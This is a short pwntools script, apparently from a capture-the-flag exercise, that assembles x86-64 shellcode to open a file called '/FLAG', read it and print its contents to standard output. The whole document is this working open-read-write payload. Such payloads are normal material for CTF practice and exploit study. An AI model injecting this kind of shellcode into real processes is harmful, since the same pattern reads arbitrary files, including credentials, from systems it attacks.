from pwn import *
context.arch = 'amd64'

shellcode = asm('''
               XOR RAX, RAX
               MOV RAX, 0x47414C462F
               PUSH RAX
               MOV RDI, RSP


               XOR RSI, RSI
               XOR RDX, RDX
               MOV RAX, 2
               SYSCALL

               MOV RDI, RAX
               MOV RSI, RSP
               MOV RDX, 100
               XOR RAX, RAX
               SYSCALL

               MOV RDI, 1
               MOV RSI, RSP
               MOV RDX, 100
               MOV RAX, 1
               SYSCALL

               XOR RDI, RDI
               MOV RAX, 60
               SYSCALL
           ''')
print(len(shellcode))